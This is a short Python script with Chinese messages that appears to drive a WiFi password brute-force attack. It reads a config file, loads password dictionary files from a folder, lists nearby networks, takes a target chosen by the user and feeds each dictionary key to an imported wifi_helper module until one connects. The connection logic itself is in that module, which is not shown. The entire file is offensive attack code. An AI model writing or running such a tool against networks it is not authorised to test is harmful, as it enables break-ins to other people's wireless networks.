import os
import time
import configparser
import wifi_helper

# python 3

# config
config = configparser.ConfigParser()
config.read("wifi.ini", encoding='UTF-8')
path = config.get("DEFAULT", "path")
wait_time = int(config.get("DEFAULT", "wait_time"))

files = os.listdir(path)
if len(files) == 0:
    print("无密码字典,程序准备退出")
    time.sleep(3)
    exit()

wifi = wifi_helper.WifiHelper(wait_time)
wifi.print_wifi_info()
index = input("输入wifi序号:\n")
print("###### 开始 ", wifi.get_ssid_by_index(int(index)), " ######")
for file in files:
    print("正在使用", file)
    # 从文件中读取keys
    keys = []
    if not os.path.isdir(file):
        f = open(path + "/" + file)
        iter_f = iter(f)
        for line in iter_f:
            keys.append(line.replace("\r", "").replace("\n", ""))
    # run keys
    if wifi.run_keys(int(index), keys):
        print("成功,程序准备退出......")
        time.sleep(5)
        break
